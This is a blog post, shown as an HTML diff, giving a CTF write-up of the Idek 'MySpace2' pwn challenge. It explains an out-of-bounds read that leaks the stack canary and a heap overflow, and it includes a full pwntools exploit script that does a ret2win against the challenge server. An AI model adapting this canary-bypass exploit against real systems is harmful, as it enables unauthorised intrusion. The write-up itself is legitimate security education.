@@ -1,0 +1,638 @@
+<!doctype html>
+<html
+  lang="en-us" 
+  data-theme-mode="true"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  Idek CTF - MySpace2 PWN Writeup | 0xFl
+</title>
+<meta
+  name="description"
+  content="CTF Player who enjoys pwn challenges"
+/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://0xFlp.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="Idek CTF - MySpace2 PWN Writeup | 0xFl" />
+  <meta
+    property="og:description"
+    content="CTF Player who enjoys pwn challenges"
+  />
+  <meta property="og:url" content="https://0xFlp.github.io/post/myspace2/" />
+  <meta
+    property="og:site_name"
+    content="0xFl Website"
+  />
+  <meta
+    property="og:image"
+    content="/images/cover_images/space.jpg"
+  />
+  <meta property="article:author" content="0xFl" />
+  <meta property="article:published_time" content="2025-09-12T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2025-09-12T00:00:00&#43;00:00" /><meta property="article:tag" content="PWNOOBBuffer-OverflowCanary" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/cover_images/space.jpg" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.58bb9bbaee29390070d1ce3a4bff4dc87e405b5611faa3321d511210d7ecb03e.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
+    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi "><img src="/images/cat-loading-unscreen.gif" alt="loading" /></div><div class="loading-word"></div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+This article does not have a corresponding language version
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav"><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/icons/home-icon.svg" alt="home icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/icons/folder.svg" alt="archives icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/icons/about.svg" alt="about icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/icons/Flag.svg" alt="ctf icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/ctf">CTFs</a>
+      </span><a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav"></nav></div>
+<header id="header"><picture></picture>
+    <img  fetchpriority="high" src="/images/cover_images/space.jpg" alt="Idek CTF - MySpace2 PWN Writeup"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">Idek CTF - MySpace2 PWN Writeup</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          class="sidebar-left"
+            ><aside id="sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a></li>
+    <li><a href="#initial-analysis">Initial Analysis</a>
+      <ul>
+        <li><a href="#display_friend"><code>display_friend</code></a></li>
+        <li><a href="#edit_friend"><code>edit_friend</code></a></li>
+        <li><a href="#leaking-the-canary">Leaking the Canary</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploit-strategy">Exploit Strategy</a></li>
+    <li><a href="#exploit-code">Exploit Code</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/test.webp"
+    data-sizes="auto"
+    alt="0xFl"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">0xFl</div>
+  <div class="sidebar-description">CTF Player who enjoys pwn challenges</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">4</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">13</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/0xFlp"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/home-icon.svg" alt="home icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/folder.svg" alt="archives icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/about.svg" alt="about icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/ctf"
+        aria-label="CTFs"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/Flag.svg" alt="ctf icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">CTFs</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-09-12 00:00:00 &#43;0000 &#43;0000" itemprop="datePublished"
+      >2025-09-12</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-09-12</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/idekctf"
+      data-aos="zoom-in"
+      >IDEKCTF</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="myspace2---idek-ctf">
+<a class="header-anchor" href="#myspace2---idek-ctf"></a>
+MySpace2 - Idek CTF
+</h1><h2 id="challenge-description">
+<a class="header-anchor" href="#challenge-description"></a>
+Challenge Description
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">I miss MySpace. Ranking my friends publicly is goated. I decided to bring it back, with new security 
+</span></span><span class="line"><span class="cl">features so we can all win!
+</span></span></code></pre></div><p>This binary is a 64-bit ELF executable with the following protections:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">➜  checksec myspace2
+</span></span><span class="line"><span class="cl">Arch:       amd64-64-little
+</span></span><span class="line"><span class="cl">RELRO:      Partial RELRO
+</span></span><span class="line"><span class="cl">Stack:      Canary found
+</span></span><span class="line"><span class="cl">NX:         NX unknown - GNU_STACK missing
+</span></span><span class="line"><span class="cl">PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stripped:   No
+</span></span><span class="line"><span class="cl">Debuginfo:  Yes
+</span></span></code></pre></div><p>We can see that <strong>PIE is disabled</strong>, the stack has a <strong>canary</strong>, and NX appears to be missing.</p>
+<h2 id="initial-analysis">
+<a class="header-anchor" href="#initial-analysis"></a>
+Initial Analysis
+</h2><p>The binary exposes several functions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">all_friends</span><span class="p">(</span><span class="kt">char</span> <span class="p">(</span><span class="o">*</span><span class="p">)[</span><span class="mi">8</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">display_friend</span><span class="p">(</span><span class="kt">char</span> <span class="p">(</span><span class="o">*</span><span class="p">)[</span><span class="mi">8</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">edit_friend</span><span class="p">(</span><span class="kt">char</span> <span class="p">(</span><span class="o">*</span><span class="p">)[</span><span class="mi">8</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_flag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">ignore_me</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">menu</span><span class="p">();</span>
+</span></span></code></pre></div><p>After analyzing the functions, the most relevant ones are <code>display_friend</code> and <code>edit_friend</code>.</p>
+<hr>
+<h3 id="display_friend">
+<a class="header-anchor" href="#display_friend"></a>
+<code>display_friend</code>
+</h3><p>This function allows us to select a friend index from <code>0</code> to <code>7</code>. However, the <strong>index validation is weak</strong>. If we input an out-of-bounds index (e.g., <code>100</code>), the program prints an error but still accesses memory at <code>base + index*8</code>. This creates a <strong>read out-of-bounds vulnerability</strong>, which we can later leverage to leak the stack canary.</p>
+<hr>
+<h3 id="edit_friend">
+<a class="header-anchor" href="#edit_friend"></a>
+<code>edit_friend</code>
+</h3><p>The <code>edit_friend</code> function allows editing a friend&rsquo;s name. The important part of the code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">friends</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>  <span class="c1">// each entry points to a 32-byte buffer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">friends</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The program uses <code>fgets</code> to read up to <code>256</code> bytes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">fgets</span><span class="p">(</span><span class="n">friends</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span></code></pre></div><p>This clearly leads to a <strong>buffer overflow</strong>. Initially, the canary may seem to prevent exploitation, but using the weak validation in <code>display_friend</code>, we can leak the canary value from the stack.</p>
+<hr>
+<h3 id="leaking-the-canary">
+<a class="header-anchor" href="#leaking-the-canary"></a>
+Leaking the Canary
+</h3><p>By examining the stack at the return of <code>edit_friend</code>, we can identify the canary&rsquo;s location:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">pwndbg&gt; x/40gx <span class="nv">$rsp</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">0x7fffffffde88: 0x6e625af2170ce400  &lt;- likely stack canary
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>Using <code>display_friend</code> with an out-of-bounds index (specifically, index 13) allows us to reliably read the stack canary. When editing friend #7, the canary is located approximately 48 bytes into the buffer. Once we have the canary, we can safely construct an exploit bypassing stack protection.</p>
+<hr>
+<h2 id="exploit-strategy">
+<a class="header-anchor" href="#exploit-strategy"></a>
+Exploit Strategy
+</h2><p>The challenge is essentially a <strong>ret2win</strong>:</p>
+<ol>
+<li>Leak the <strong>stack canary</strong> using <code>display_friend</code>.</li>
+<li>Overflow the buffer in <code>edit_friend</code> while preserving the canary.</li>
+<li>Overwrite the return address with the address of <code>get_flag()</code>.</li>
+</ol>
+<hr>
+<h2 id="exploit-code">
+<a class="header-anchor" href="#exploit-code"></a>
+Exploit Code
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./myspace2&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;myspace2.chal.idek.team&#39;</span><span class="p">,</span><span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">get_flag</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40129d</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">48</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak the canary</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;13&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">1. See Top Friends&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">canary_line</span> <span class="o">=</span> <span class="n">leak</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="n">canary_line</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>  <span class="c1"># Convert to integer (little-endian)</span>
+</span></span><span class="line"><span class="cl"><span class="n">canary_packed</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Canary: </span><span class="si">{</span><span class="n">canary_packed</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Build payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset1</span> <span class="o">+</span> <span class="n">canary_packed</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">get_flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;7&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Running Exploit:</p>
+<figure><img src="/images/posts_images/idekctf/run_exploit.png"
+    alt="exploit output">
+</figure>
+
+<hr>
+<h2 id="conclusion">
+<a class="header-anchor" href="#conclusion"></a>
+Conclusion
+</h2><p>This challenge highlights:</p>
+<ul>
+<li><strong>Out-of-bounds reads</strong> can be leveraged to leak stack canaries.</li>
+<li><strong>Heap-allocated buffers</strong> combined with improper bounds checking can lead to buffer overflows.</li>
+<li>Careful analysis of binary protections is essential to craft a reliable exploit.</li>
+</ul>
+<p>This was a clean example of bypassing stack canaries to achieve a ret2win exploit in a CTF scenario.</p>
+<p>If you notice any inaccuracies or mistakes in this writeup, please feel free to contact me. I’d be happy to clarify or correct any information.</p>
+</div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/pwn"
+        rel="tag"
+        >PWN</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/oob"
+        rel="tag"
+        >OOB</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/buffer-overflow"
+        rel="tag"
+        >BUFFER-OVERFLOW</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/canary"
+        rel="tag"
+        >CANARY</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+            data-src="images/CTFs_images/Sekai_CTF.png"
+            data-sizes="auto"
+            alt="Sekai CTF - My-Flask-App WEB Writeup"
+            class="lazyload"
+          /><a href="/post/myflaskapp/"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">Sekai CTF - My-Flask-App WEB Writeup</h3>
+      </div><div class="article-nav-link-wrap right"><img
+            data-src="images/CTFs_images/hackthebox.png"
+            data-sizes="auto"
+            alt="Space – HTB Challenge"
+            class="lazyload"
+          /><a href="/post/space/"></a>
+        <div class="article-nav-caption">Next</div>
+        <h3 class="article-nav-title">Space – HTB Challenge</h3>
+      </div></nav></article></section>
+        </div><footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      0xFl
+    </div><div>
+        Powered by&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;1.4k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;00:09</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >Number of visits&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >Number of visitors&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a></li>
+    <li><a href="#initial-analysis">Initial Analysis</a>
+      <ul>
+        <li><a href="#display_friend"><code>display_friend</code></a></li>
+        <li><a href="#edit_friend"><code>edit_friend</code></a></li>
+        <li><a href="#leaking-the-canary">Leaking the Canary</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploit-strategy">Exploit Strategy</a></li>
+    <li><a href="#exploit-code">Exploit Code</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/test.webp"
+    data-sizes="auto"
+    alt="0xFl"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">0xFl</div>
+  <div class="sidebar-description">CTF Player who enjoys pwn challenges</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">4</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">13</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/0xFlp"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/home-icon.svg" alt="home icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/folder.svg" alt="archives icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/about.svg" alt="about icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/ctf"
+        aria-label="CTFs"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/Flag.svg" alt="ctf icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">CTFs</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
